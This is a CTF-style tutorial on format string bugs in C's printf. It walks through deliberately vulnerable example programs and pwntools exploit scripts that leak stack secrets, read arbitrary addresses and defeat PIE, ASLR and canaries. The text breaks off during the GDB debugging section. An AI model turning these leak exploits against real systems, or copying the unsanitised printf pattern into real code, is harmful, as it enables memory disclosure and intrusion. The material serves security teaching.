---
title: A Definitive Guide to Format String Bug
date: '2024-03-06'
tags: ['ctf-techs', 'fsb', 'format-string', 'printf', 'pwn', 'guides']
draft: false
summary: A detailed guide on how printf's can be used for arbitrary read and arbitrary write.
---

## Introduction

When I was learning about FSB's, I found an overwhelming amount of content that had detailed writeups, but none really answered the basic questions that I had in mind. Debugging FSBs for me was hard; especially when I was new to pwn. So, to answer all those questions that I had, I'm writing the detailed guide.

In this guide, I'll be explaining intricate details of Format String Bugs, how they occur, how they work and how they can be exploited to read and write values to an arbitrary location and get a shell. This blog post will go in-depth to make sure that we fully understand each concept as we go through them.

All the exploits, source codes, Makefiles and everything can be found in this [Github Repo](https://github.com/TheFlash2k/blog-extras/tree/main/fsb-guide).

## Table of Contents

1. **[What is a Format String](#what-is-a-format-string)**
    - **[Specifier](#specifiers)**
        - **[Length sub-specifier](#length-sub-specifier)**
        - **[Position sub-specifier](#position-sub-specifier)**
2. **[What is Printf](#what-is-printf)**
    - **[Usage](#usage)**
3. **[Format String Bug](#format-string-bug)**
    - [Occurance of an FSB](#occurance-of-an-fsb)
4. **[Arbitrary Read](#arbitrary-read)**
    - [From the stack](#from-the-stack)
    - [From an address](#from-an-address)
        - [Identifying the format string start offset](#identifying-the-format-string-start-offset)
    - [Leaking PIE/ASLR/Canaries](#leaking-pieaslrcanaries)
5. [Debugging FSB](#debugging-a-fsb)
6. **[Arbitrary Write](#arbitrary-write)**
    - [To an address](#to-an-address)
        - [Writing one byte](#writing-one-byte)
            - [Bytes Gimmick](#bytes-gimmick)
        - [Writing two bytes](#writing-two-bytes)
            - [Byte-by-byte](#writing-two-bytes-one-at-a-time)
        - [Writing four bytes](#writing-four-bytes)
        - [Writing eight bytes](#writing-eight-bytes)
    - [Copying Memory](#copy-memory)
    - [Overwriting GOT Entries](#overwriting-entries-on-the-global-offset-table)
    - [Writing a ROP Chain](#writing-a-rop-chain-using-fsb)
7. **[Pwntools and other tools](#pwntools-and-other-tools)**

---

## What is a Format String?

In order to understand `Format String Bug`, we must first fully understand what `Format String` is.

> A format string is a string that contains special placeholders or format specifiers, which are used to define the layout and formatting of variables when creating formatted output. These format specifiers are placeholders for values that will be substituted into the string during runtime.

A format specifier must follow the following syntax (Reference: [cplusplus.com](https://cplusplus.com/reference/cstdio/printf/)):

```c
%[flags][width][.precision][length]specifer
```

### Specifiers

For each of the data type in C/C++, there exists a specifier that needs to passed for the value that is to be displayed. There exist the following the specifiers:

| specifier | data-type |
| --- | --- |
| d or i | Signed Decimal Integer |
| u | Unsigned Decimal Integer |
| o | Unsigned Octal |
| x or X | Unsigned Hexadecimal Integer |
| f or F | Decimal Floating Point |
| e or E | Scientific notation (mantissa/exponent) |
| g or G | Use the shortest representation: %e or %f |
| a or A | Hexadecimal floating point |
| c | Character |
| s | String of characters (`NULL` terminated) |
| p | Pointer address
| n | **Important:** This doesn't really print anything, but argument to this must be a pointer to a signed int. This will write the number of characters written so for the pointed location. |
| % | A % followed by another % character will write a single % to the stream |

The format specifier can also contain sub-specifiers: flags, width, .precision and length modifiers (in that order), which are optional and follow these specifications. For our exploitation purposes, the only thing that is worth noting is the `length` modifier. However, it is recommended that we understand the inner workings, for that, I highly recommend that you go and read [this](https://cplusplus.com/reference/cstdio/printf/).

#### Length sub-specifier

The length sub-specifier modifies the length of the data type.

| length sub-specifier | d,i | u,o,x,X | f,F,e,E,g,G,a,A | c | s | p | n |
| --- | --- | --- | --- | --- | --- | --- | --- |
| (none) | int | unsigned int | double | int | char* | void* | int* |
| hh | signed char (one-byte) | unsigned char | - | - | - | - | signed char* |
| h | short int (2-bytes) | unsigned short int | - | - | - | - | short int* |
| l | long int (8-bytes) | unsigned long int | - | wint_t | wchar_t* | - | long int* |
| ll | long long int (8-bytes) | unsigned long long int | - | - | - | - | long long int* |

> NOTE: There are other sub-specifiers, but we'll focus on only these.

#### Position sub-specifier

There's also one sub-specifier (per-se) that allows an exact position offset value (from `RSP`) that can be passed to a specifier specified. The usage of that is as follows:

```c
%{POSITION}${SPECIFIER}

/* Example: */
%10$p
// This will print the 10th value as a pointer address from the RSP.
```

## What is Printf

According to [`cplusplus.com`](https://cplusplus.com/reference/cstdio/printf/):

> Writes the C string pointed by format to the standard output (stdout). If format includes format specifiers (subsequences beginning with %), the additional arguments following format are formatted and inserted in the resulting string replacing their respective specifiers.

In simpler terms, `printf` is a function that takes in a [`format specifier`](#specifiers), parses it and displays it to `stdout`. Printf can take `N` number of arguments. These type of functions that can take an arbitrary number of arguments are often known as `variadic` functions. These functions have `...` in their arguments list refering to `N` number of arguments input. The prototype of `printf` is as follows:

```c
int printf ( const char * format, ... );
```

> Fun-Fact: When printf doesn't have any format specifier, compilers such as `gcc` and `clang` often compile `printf` to `puts` for performance enhancment.

The following functions from the format string family are often most vulnerable to FSBs:

1. `printf()`
2. `fprintf()`
3. `sprintf()`
4. `vprintf()`
5. `snprintf()`
6. `vsnprintf()`
7. `vfprintf()`

### Usage

Let's consider the following program to understand the basic usage of printf

```c:printf-usage.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char* name = "Ashfaq Nadeem\0";
    int age = 22;
    printf("My name is %s and I'm %d years old!\n", name, age);
}
```

We can compile this program using:

```bash:Terminal
gcc -o printf-usage printf-usage.c -w
```

Once we run the `./printf-usage` binary, we get an output like this:

```txt:stdout
My name is Ashfaq Nadeem and I'm 22 years old!
```

Now, what happened under the hood was, the `%s`, looked for it's value from the first specified argument, i.e. `name`, and `%d` looked for it's argument in the second argument.

Using the position sub-specifier, we'll make the third specifier read value from the second argument passed to `printf`. It would look something like this:

```c:print-usage-2.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char* name = "Ashfaq Nadeem\0";
    int age = 22;
    printf("My name is %s and I'm %d years old. But people don't really believe that I'm %2$d years old.\n", name, age);
}
```

> NOTE: we might get a warning, but we can ignore this. ;)

The output for this becomes:

```txt:stdout
My name is Ashfaq Nadeem and I'm 22 years old. But people don't really believe that I'm 22 years old.
```

What happened here? Well, the second argument passed to `printf` was `age`. In the third specifier, i.e. `%2$d`, what we simply did was tell printf to use the second argument passed to it, and put it here.

## Format String Bug

A Format String Bug (FSB) is a bug that occurs when an unsanitized input is directly passed to a printf and the input contains a `format string`.

### Occurance of an FSB

Let's consider the following code:

```c:fsb-test.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    int age = 22;
    printf("My age: %d\nMy ID: %d\nMy uuid: %d\nMy data: %d\n", age);
}
```

Now, what's the exact problem in this code? Well, We've only passed one argument to the printf, i.e. `age`, but there are `3` more specifiers that do not have an associated variable, what happens in this case? The values that are currently stored on the stack, will start printing. The output will be something like this:

```txt:stdout
My age: 22
My ID: 1478696264
My uuid: -1761119872
My data: 0
```

Why is that? That is because, in `printf`, the format specifiers can read value off of the stack. If no argument is provided, the next value stored will be popped into the specifier that is present. Therefore, in our case, we only passed `age`, and nothing else. `Printf`, automatically got the second, third and forth value from the stack and populated the format string itself.

The question here becomes, ***This is a bug in code, how is this even exploitable?***. The answer is pretty simple, what if you control what is directly passed into the printf?

To better understand this, consider this code:

```c:fsb-test-2.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[0x100];
    printf("Enter your name: ");
    scanf("%250s", buffer);
    printf(buffer);
}
```

Now, in this code, we can see that, our input is directly passed into `printf`, i.e. `printf(buffer)`. The problem here is:

1. If we pass a format string as input; let's say `%d`, then the function call will become: `printf("%d")`, which will simply derefence the first value as an integer and give us the output. Let's pass input: `%d.%d.%d.%d` as input to this program:

```txt:stdout
Enter your name: %d.%d.%d.%d
10.0.0.10
```

### Exploitation of an FSB

Now, we've seen how we can read a value from the stack, but there are ways we can also write values on to the stack, and other places which can give us code-execution. FSB can be exploited to let us do the following:

1. Read arbitrary data from the stack
2. Read arbitrary data from an address
3. Read ELF/library addresses from the stack to bypass PIE/ASLR
4. Write arbitrary data to the stack
5. Overwrite an entry on the GOT to override execution
6. Write a ROP chain and execute it

## Arbitrary Read

We have already taken a look at what arbitrary read looks like in [Occurance of an FSB](#occurance-of-an-fsb) section. However, in this section, we'll dive really deep into this.

Now, using an FSB, we can do to two kinds of reads:

- From the stack
- From an address

### From the stack

Now, we've understood the theory behind how printf works and how we can easily read values from the stack using a simple FSB. Let's explore this a bit further. To better understand, let's consider the following program:

```c:fsb-stack-read.c
// gcc -o fsb-stack-read fsb-stack-read.c -w

#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[0x100];
    char admin_pwd[0x20] = { "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD" };

    printf("What is your name? ");
    scanf("%255s", buffer);

    printf("Welcome ");
    printf(buffer);

    printf("Do you know what the admin password is? ");
    scanf("%255s", buffer);

    if(strcmp(admin_pwd, buffer) == 0) {
        printf("You have successfully passed this test...");
        return 0;
    }

    printf("Well, %s; you failed!", buffer);
    return 1;
}
```

Now, in this program, the first input takes values as input and passes it directly into the `printf`, giving us an `fsb`. The next input, will ask for an `admin password` and then compares it with `admin_pwd`. In our case, the `admin_pwd` is hardcoded, however, in somecases, we might have to leak values from the stack. So, let's try and leak the `admin_pwd`.

> NOTE: We have PIE enabled on this program so we can't directly give it the address of `admin_pwd` to leak value.

Let's firstly start out by simply passing `%s` specifier to the `name` input:

```txt:stdout
What is your name? %s
[1]    494914 segmentation fault (core dumped)  ./main
```

Wait, our program crashed? This is because, the `%s` specifier actually dereferences the value that is present, this is often used for `char*`, which are actually pointers and therefore, the program crashed because the program tried to read value from a non-existent/unreachable address. Let's check the address stored at this position by using the `%p` specifier:

```txt:stdout
What is your name? %p
Welcome 0x20656d6f636c6557Do you know what the admin password is? 
```

Well, the program did not crash this time, and we got a weird looking hex, `0x20656d6f636c6557`. Well, now we know why our program crashed when we entered `%s`. Now, what if we want to read the next values from the stack? Well, [position sub-specifiers](#position-sub-specifier) are our best friend. Let's try and enter `%2$p`, to print the second value from the stack. Also, this time; I'll add a seperator in my input to easily be able to identify the data. The input that I'll pass will be: `|%2$p|`

```txt:stdout
What is your name? |%2$p|
Welcome |(nil)|Do you know what the admin password is? 
```

Well, this time, we can see that we got `(nil)`, which indicates that `0x00000000` exists in this location. Let's try and read multiple values from the stack. The input that I'll pass will be: `|%3$p|%4$p|%5$p|%6$p|`

```txt:stdout
What is your name? |%3$p|%4$p|%5$p|%6$p|
Welcome |(nil)|0xa|0x8|0x4141414141414141|Do you know what the admin password is? 
```

Now, we can see that, on `%6$p`, we got `0x4141414141414141`, which corresponds to `AAAAAAAA`. Looking at the admin_pwd, we can see that, from offset `6`, `admin_pwd` exists. We can leak, `%7`, `%8` and `%9`, to get the remaining data of `admin_pwd` from the stack:

```txt:stdout
What is your name? |%6$p|%7$p|%8$p|%9$p|
Welcome |0x4141414141414141|0x4242424242424242|0x4343434343434343|0x4444444444444444|Do you know what the admin password is? 
```

Now, we have the value from the stack.

> NOTE: This value is in little endian, we cannot see it because of the repeating values. So, parse it accordingly.

Similar to this technique, we can also leak strings from the stack by just changing the specifier to `%s`. However, for the strings, make sure to pass only one specifier at a time to ensure that we get a string as the program will just crash if the address on that specifier is invalid.

Now, in order to understand this concept fully, let's consider another source code:

```c:fsb-stack-read2.c
// gcc -o fsb-stack-read-2 fsb-stack-read-2.c -w

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SIZE 0x50

int main() {

    char buffer[SIZE];
    char name[SIZE];
    char secret[SIZE] = { 0 };

    /* read secret from a file. */
    FILE *f = fopen("secret.txt", "r");
    fgets(secret, SIZE, f);

    printf("What is your name? ");
    fgets(name, SIZE, stdin);

    printf("Welcome ");
    printf(name);

    printf("In order to enter, you must know the admin password: ");
    fgets(buffer, SIZE, stdin);

    if(strcmp(secret, buffer) == 0) {
        puts("Welcome to the secret portion...");
        return 0;
    }
    puts("You failed!");

    return 1;
}
```

Now, in the secret.txt, i'll add the following content:

```txt:secret.txt
this_is_a_secret_value

```

Now, let's try and run this program and find out exactly the offsets where we might have the `secret` stored. Since PIE is enabled on this binary, we can't directly leak the string on a specific address. So, using the same `'%p'` technique, let's try and leak the values:

```txt:stdout
What is your name? %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Welcome 0x20656d6f636c6557.(nil).(nil).0x7ffcdb386910.0x8.0x34000000340.0x5618aa38b2a0.0x34000000340.0x34000000340.0x34000000340.0x34000000340.0x34000000340.0x34000000340.0x34000000340.0x34000000340.(nil).0x100.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70
```

Nothing here seems to be of interest, except the first one. One question I had, how do I know what to decode and what not to decode, well, let's try and `unhex` the first leak:

```bash:Terminal
$ unhex 20656d6f636c6557
 emocleW
```

Like I told you before, this is in little endian, so we have to reverse the unhex result to get the string back:

```bash:Terminal
$ unhex 20656d6f636c6557 | rev
Welcome 
```

So, similar to this technique, we will have to unhex and then reverse each of the data that we get, but **Isn't it a lot of work?**. It is. Also, we tried upto `26` values, but still didn't get one that would look something like the flag, so; let's write a simple script, that will create our payload in a loop and then sent it. For sake of simplicity and re-usability, we'll create a simple `generate` function that will generate the payload for us.

```py:exploit-fsb-stack-read.py
#!/usr/bin/env python3

from pwn import *

def generate(start, end, specifier="p", seperator="."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload

io = process("./fsb-stack-read-2")

start = 26
payload = generate(start, start+10)

io.sendline(payload)
io.interactive()
```

Now, we have this barebones structure for our exploit, let's run this, and we will get leaks from `26` to `36`:

```bash:Terminal
$ ./exploit-fsb-stack-read.py
[+] Starting local process './fsb-stack-read-2': pid 1136956
[*] Switching to interactive mode
What is your name? Welcome (nil).(nil).0x5f73695f73696874.0x7465726365735f61.0x65756c61765f.(nil).(nil).(nil).(nil).(nil).
$  
```

Well, now we can see that, on 28th index and till 30th, we see some hex that represents ascii characters, let's try and unhex this:

```bash:Terminal
$ unhex 5f73695f73696874 | rev
this_is_
```

Okay, so now we know that this is our secret. Let's; programatically, get 28th to 30th index, and unhex the values. Therefore, the final exploit becomes:

```py:exploit-fsb-stack-read.py
#!/usr/bin/env python3

from pwn import *

def generate(start: int, end: int, specifier: str = "p", seperator: str = "."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload

def fix(payload: bytes, seperator: str = "."):
    """ Unhex the payload and return as a string """
    rt = b""
    for i in payload.split(b'.')[:-1]: # the last one is empty
        i = i[2:] # removing the 0x
        if i[0] == 97: # remove the newline
            i = i[1:]
        rt += unhex(i)[::-1] # unhex and rev
    return rt
    io = process("./fsb-stack-read-2")

# Generated Payload: %28$p.%29$p.%30$p.
payload = generate(28, 31)

io.sendline(payload)
io.recvuntil(b"Welcome ")
leak = io.recvline()[:-1]
print(f"Leaked: {leak}")
secret = fix(leak)
info(f"Got secret {secret}")
io.sendline(secret)
io.interactive()
```

Now, once we run this exploit, we can see that we automatically firstly generate the payload and then send it, get the leaked values and fix those leaked values and send the secret back.

Similar to the script that we've written, I have made a generic script that will fuzz, with all the user provided specifiers and decode certain specifiers as well. You can check that out on my [gist](https://gist.github.com/TheFlash2k/4767efe1155dbad6a415230c43ddfe46).

### From an address

In the previous technique, we simply leaked values from the stack to read the contents of a variable. Now, what if we want to leak value from a specified address. What then? Well, FSBs are powerful enough to do just that. Let's consider the following program:

```c:fsb-address-read.c
#include <stdio.h>
#include <stdlib.h>

char flag[100];

void read_flag() {
    FILE *file;
    file = fopen("flag.txt", "r");
    fgets(flag, 100, file);
    fclose(file);
}

int main() {
    char buffer[100];
    read_flag();
    printf("Flag is stored at: %p\n", flag);
    printf("Who are you? ");
    scanf("%100s", buffer);
    printf(buffer);
}
```

> NOTE: For this technique, we'll be using `pwntools` to write an exploit.

We'll compile this program with PIE disabled:

```bash:Terminal
gcc -o fsb-address-read fsb-address-read.c -no-pie -w
```

Now, after running the program, we're greeted with the following output:

```txt:stdout
Flag is stored at: 0x404080
Who are you? 
```

Now, we can see that, we're given the address of `flag`, and we need to leak the value from that address. There are two ways of doing this.

1. Writing address before our format string
2. Writing address after our format string

Now, the first one is most often used, however, the problem with that approach is, if `printf` encounters a NULL-byte, the format string won't execute. Meaning, let's say, flag was at address `0x404000`, then; in that scenario, if we actually passed the address before the format string, the `printf` would stop on getting that `0x00`. Therefore, we often write after our format string. Now, since the address passed to us in this example is `6 bytes` long, if we add `00` before it, our printf will only display the address and won't execute the format string therefore, we'll keep our focus on writing the address after our format string.

Before writing, we need to do one important thing:

#### Identifying the Format String start offset

Now, in order to make sure that we write at the exact offset on the stack where our format string is; we need to find it. Finding it is pretty easy. We normally send in `A`'s as input, and then send multiple specifier. Whatever specifier returns `0x41`, we can easily know that that'll be the start of our format string.

So, let's send the following input to our `fsb-address-read` program:

```bash:Terminal
AAAAAAAA|%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

```txt:stdout
Flag is stored at: 0x404080
Who are you? AAAAAAAA|%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAAAAAA|0xa.(nil).(nil).0xa.0x7c.0x4141414141414141.0x252e70252e70257c.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x7f0070252e70.0x7ffd031ada36
```

Now, we can see that, at position 6, we got `0x4141414141414141`, meaning that we found the start of our format string to be `6`. We can confirm this by sending: `AAAAAAAA|%6$p` as input:

```txt:stdout
Flag is stored at: 0x404080
Who are you? AAAAAAAA|%6$p
AAAAAAAA|0x4141414141414141
```

#### Writing the address after our string

Now, before moving forwards, let's write a simple `exploit.py`, that will extract the leaked address:

```py:exploit-fsb-address-read.py
#!/usr/bin/env python3

from pwn import *

io = process("./fsb-address-read")
io.recvuntil(b": ")
leak = int(io.recvline(), 16)
info("Flag is at: %#x" % leak)
io.interactive()
```

Now, we have a boilerplate code ready for us. Next, we need to start writing a payload. So, firstly, we know that `%6` is the position where our input starts. So, what we need to do:

- Write the address of `flag` on to the stack.
- Dereference the position where the data was written on the stack.

So, let's see since we'll write the address after the format string (to avoid breaking of printf on NULLs), let's firstly craft our format string. We know, that, we'll want to reference a value from an address that'll be stored on the stack. So, the address will be `8` bytes. Let's also take into account that; `%6$s`, will also be written on to the stack. Adding those two up, `8+4` (4 is `'%6$s'`'s length), i.e. 12. But, we know that addresses stored on the stack are offset by 8. So, we need to pad our payload so that it's length becomes divisible by 8. So, the payload can look something like this:

```py
payload = b"%6$s||||" + p64(leak)
```

> | here represents padding, you can whatever you like instead of this.

Now, one thing we need to understand here. The first value was referenced using `%6`. But, if we do a mental map, following data will be stored on the stack:

```hex:stack
rsp ...
rsp+6 : %6$s|||| : 0x7c7c7c7c70243620
rsp+7 : leak : 0x0000000000404080
```

Now, if we were to `%6$s`, instead of leaking the value of `0x404080`, the value on 6th address will be `0x7c7c7c7c70243625`, and this will cause the program to crash. We can confirm this by using GDB.

![alt text](/static/ctf-techs/image.png)

and if we check the value currently stored at rdi:

![alt text](/static/ctf-techs/image-1.png)

So, in order to read the value, we'll read the 7th offset, instead of the 6th:

![alt text](/static/ctf-techs/image-2.png)

Therefore, the final exploit becomes:

#### fsb-address-read exploit

```py:exploit-fsb-address-read.py
#!/usr/bin/env python3

from pwn import *

io = process("./fsb-address-read")
io.recvuntil(b": ")
leak = int(io.recvline(), 16)
info("Flag is at: %#x" % leak)
payload = b"%7$s||||" + p64(leak)
io.sendline(payload)
io.interactive()
```

### Leaking PIE/ASLR/Canaries

The whole idea behind PIE, ASLR and Canaries is the randomness to ensure that on each launch, the value change, whether it be the base of the binary (in case of PIE), the load address of library (in case of ASLR), or the stack canary. Format String Bug is such an amazing bug that allows to leak the address from the stack. These addresses may belong to the binary, the libc or may very well be the canary.

Why these leaks may be important, you might ask. Well, in case of PIE and ASLR, the binary is loaded into memory at a random address. However, the difference between the base of the loaded binary and a function (let's say `printf`), is always constant. So, if we somehow get a leak, we can calculate the distance from a certain base (loaded in memory at the time of leak) and we can easily get the offset, that will always ensure that we a leak of a known offset in memory.

To fully understand this, let's take the following example:

Let's say, that on launch of a program, libc is loaded at: `0x7ffcf85dd000`, and puts is located at `0x7ffcf85de420`. Now, using a format string let's say `%16$p`, we are able to leak the value of `puts`, that came out to be `0x7ffcf85dd420`. Now, for me to find a constant offset everytime, what I can do, is simply subtract the leak that I got, with the base of libc. i.e. `0x7ffcf85de420-0x7ffcf85dd000`, and I got the answer: `0x1420`. Now, the thing is, whenever I leak the value using `%16$p`, I can easily find the base of libc, by simply doing `leak-0x1420` and the answer will always result in the base of libc. This exact technique can be used to find the `PIE-base` of binaries.

In case of canaries, we can also simply leak them using a format strings. One question that I had was `How do I know what's the canary?`. Well, in `pwndbg`, we have a command called `canary` that will simply list the canary. Another easier gimmick is; all canaries end with `00`, so, one the stack, we can keep an eye out for numbers that end with `00`.

Let's consider the following program:

```c:fsb-leaks.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[0x100];
    printf("What is your name? ");
    fgets(buffer, 0x100, stdin);
    printf(buffer);

    printf("Is it really your name? ");
    gets(buffer);

    return 0;
}
```

Now, we'll compile this program with all mitigations:

```bash:Terminal
gcc -o fsb-leaks fsb-leaks.c -w
```

> We will get a linker warning, that is because we're using `gets`, so we can just ignore that.

I've already wrote a writeup in which I explain in greate detail about how you can leak libc values and find the base. You can read about it [here](/blog/writeups/blackhatmea23-quals/pwn/Profile#leaking-the-libc-address-using-the-fsb-vulnerability)

Now, let's run the binary in GDB and start leaking values.

![alt text](/static/ctf-techs/image-13.png)

Now, here, we will first press `CTRL+C`, to break the program and enter GDB and then, we'll type `vmmap` to find out the virtual memory mapping of this:

![alt text](/static/ctf-techs/image-14.png)

Here we can see that, the PIE-base is `0x555555554000` and ends at `0x555555559000`, so any leaks between this range will give us PIE-leak. Similarly, `0x7ffff7db7000` to `0x7ffff7fa5000` is the address range of libc.

> NOTE: In GDB, we have ASLR off, so we'll always get the same addresses.

Looking back at the data we got:

```txt:stdout
What is your name? %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.                                                         
0x5555555596b1.(nil).0x5555555596f3.0x7fffffffd590.0x7c.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x340000a2e70.0x34000000340.(nil).0x100.(nil).(nil).(nil).(nil).(nil).
```

The first leaked address can be seen that might belong to the `pie`, however, you can see that `9b61` doesn't belong to the pie range of `0x....4000` to `9000`. Therefore, let's try and leak more values.

For this purpose, I made a simple command line utility in python that can generate format string patterns for us. You can take a look at in my [gist](https://gist.github.com/TheFlash2k/2ee4650c3fc850caceb558ef82fa9bd6)

Since, in the last payload, we leaked 22 values from the stack, let's leak 22 more, starting from 23. We can generate a simple payload using my script:

```bash:Terminal
$ fmt-generator -s 23 -a 22 --with-index
```

This generated the following payload:

```txt:stdout
|23=%23$p|24=%24$p|25=%25$p|26=%26$p|27=%27$p|28=%28$p|29=%29$p|30=%30$p|31=%31$p|32=%32$p|33=%33$p|34=%34$p|35=%35$p|36=%36$p|37=%37$p|38=%38$p|39=%39$p|40=%40$p|41=%41$p|42=%42$p|43=%43$p|44=%44$p|45=%45$p
```

Now, let's pass this input to our program once again in GDB. The output we got is:

```txt:stdout
What is your name? |23=%23$p|24=%24$p|25=%25$p|26=%26$p|27=%27$p|28=%28$p|29=%29$p|30=%30$p|31=%31$p|32=%32$p|33=%33$p|34=%34$p|35=%35$p|36=%36$p|37=%37$p|38=%38$p|39=%39$p|40=%40$p|41=%41$p|42=%42$p|43=%43$p|44=%44$p|45=%45$p
|23=0x70243833253d3833|24=0x243933253d39337c|25=0x3034253d30347c70|26=0x34253d31347c7024|27=0x253d32347c702431|28=0x3d33347c70243234|29=0x34347c7024333425|30=0x347c70243434253d|31=0xa70243534253d35|32=0x7fffffffd600|33=0x55555555529d|34=0x7ffff7fa82e8|35=0x555555555250|36=(nil)|37=0x5555555550c0|38=0x7fffffffd790|39=0x9b65a96d8a91da00|40=(nil)|41=0x7ffff7ddb083|42=0x7ffff7ffc620|43=0x7fffffffd798|44=0x100000000|45=0x5555555551a9
Is it really your name?
```

Now, in this output, we see quite a lot of values that will be helpful for us. Firstly, we can see that at index `33`, we have an PIE leak, same at `35`, `37`, and `45`. Let's consider the value at index `33`. In gdb, we can use `xinfo <address>` command to find the exact offset from the base. So, in our case: `xinfo 0x55555555529d` gives us:

![alt text](/static/ctf-techs/image-15.png)

We can see that, the difference from the leak address to the base is `0x129d`. So, whenever we'll do `%33$p` and if we subtract `0x129d` from the leaked value, we can get the base of the binary.

In the above output, we got another juicy value i.e. the `canary`, where; you might ask. Well, like I told you before, canary values often end in `00`, so; if we look at `39` index, we can see: `39=0x9b65a96d8a91da00`. Let's confirm if this is the canary using GDB:

![alt text](/static/ctf-techs/image-16.png)

Perfect, and lastly, we also got a libc leak, looking closely at index `41`. We can see `41=0x7ffff7ddb083` which corresponds to the range that we analyzed before. So, similar to pie, let's find the offset of the leak with base using `xinfo 0x7ffff7ddb083` command:

![alt text](/static/ctf-techs/image-17.png)

We can see that the offset is `0x24083`. So, to sum up, we can simply leak all three values using a single payload, i.e:

```py
payload = b"|%33$p|%39$p|%41$p|"
```

And then upon each leak, we can parse accordingly, a small exploit for parsing these values look something like:

```py:exploit-fsb-leaks.py
#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./fsb-leaks")
libc = elf.libc
io = process()

payload = b"|%33$p|%39$p|%41$p|"
io.sendline(payload)

leaks = io.recvline().split(b'|')[1:-1]
pieleak = int(leaks[0], 16)
canary = int(leaks[1], 16)
libc_leak = int(leaks[2], 16)

elf.address = pieleak - 0x129d
libc.address = libc_leak - 0x24083

print("Pie Base : %#x" % elf.address)
print("Canary   : %#x" % canary)
print("Libc Base: %#x" % libc.address)

# do the rest of the exploit here....
```

Running this on the binary without GDB to ensure that ASLR is on:

![alt text](/static/ctf-techs/image-18.png)

We can be sure if we have the base of PIE/LIBC if the last three nibbles end in 0.

## Debugging a FSB

When I was learning FSB's, One of the hardest things for me was debugging and finding out exactly where my payload was messing up and how I could fix it. If you're stuck at a similar position, I'll try my best to explain this concept to you in detail.

For this demonstration, I'll use [this](#from-an-address) source code. Now, in the [exploit](#fsb-address-read-exploit) that we wrote for reading data from an address, we made a mental map and understood that we had to `pad` in order to get the value into the next address. Instead of a mental map, let's use GDB.
Firstly, we must identify, at which point we must break and analyze the values in stack/registers. For that, let's simply: `disass main`:

![alt text](/static/ctf-techs/image-3.png)

Now, we can see that:

```hex
0x0000000000401292 <+114>:   call   0x4010b0 <printf@plt>
```

Is the call to printf that we're looking for. How did I come to know that this is the printf call that I'm looking for?

```hex
   0x0000000000401286 <+102>:   lea    rax,[rbp-0x70]
   0x000000000040128a <+106>:   mov    rdi,rax
```

In this scenario, whatever that I'm inputting is stored at `rbp-0x70`. And, that data is being loaded into `rax`, and then passed in as the first argument `printf`.

Now, in order to set breakpoint in gdb, we use `b *<ADDRESS>`. So, we can either use: `b *0x0000000000401292` or using function relative offsets: `b *main+114`. We'll write an exploit in pwntools that will automatically attach GDB to it. And, instead of using a working payload, we'll use the first crafted payload i.e. `%6$s`

```py:exploit-debugging.py
#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
io = process("./fsb-address-read")
if args.GDB: gdb.attach(io, "b *main+114") # adding the gdb breakpoint here.
io.recvuntil(b": ")
leak = int(io.recvline(), 16)
info("Flag is at: %#x" % leak)
payload = b"%6$s" + p64(leak)
io.sendline(payload)
io.interactive()
```

Now, in order to run this, we need to run it as:

```bash:Terminal
$ tmux
# NOTE: tmux is a must, if you don't want to use tmux, remove the `context.terminal` line from the exploit and run the command:
$ python3 exploit-debugging.py GDB
```

Now, once we have the gdb pane in tmux, we need to press `c` to continue our execution.

![alt text](/static/ctf-techs/image-4.png)

Now, we can see that:

```hex
 ► 0x401292 <main+114>           call   printf@plt                      <printf@plt>
        format: 0x7ffc5f332ca0 ◂— 0x40408073243625
        vararg: 0xa      
```

The data at `0x7ffc5f332ca0` is `0x40408073243625`, which looks like a mixture of the address i.e. `0x404080` and our format string. Let's analyze the data at the stack pointer:

```gdb
pwndbg> x/gx $rsp
```

![alt text](/static/ctf-techs/image-5.png)

We can see more the next 10 bytes as well:

```gdb
pwndbg> x/10gx $rsp
```

![alt text](/static/ctf-techs/image-6.png)

Now, we can clearly see that, the data being passed to `printf` is `0x0040408073243625` and our payload i.e. `%6$s`, will dereference this value, which will cause a segfault.

Now, what we need to do, is move `0x404080` to the next address. How can we do that? The padding... We can see that, there are four bytes that; if added will move the flag-address to the next address. So, we'll add four characters for padding. Our payload will look something like this now:

```py
payload = b"%6$s||||" + p64(leak)
```

Now, when exploit is run with GDB:

![alt text](/static/ctf-techs/image-7.png)

Looking at the data in stack:

```gdb
pwndbg> x/10gx $rsp
```

![alt text](/static/ctf-techs/image-8.png)

We can clearly see that:

```h
0x7ffd790e8360: 0x7c7c7c7c73243625      0x0000000000404080
```

`0x404080` is written to the next chunk in memory. Let's press `C` to continue the execution of this program.

![alt text](/static/ctf-techs/image-9.png)

We received a SEGFAULt, why? Remember, we offset `6`, but at the `6th` position, `0x7c7c7c7c73243625` exists. Therefore, we now need to offset `7` in order to make sure that we read the `7th` value from the stack. We can confirm this, by getting the value of `rdi` when the program crashed:

```h
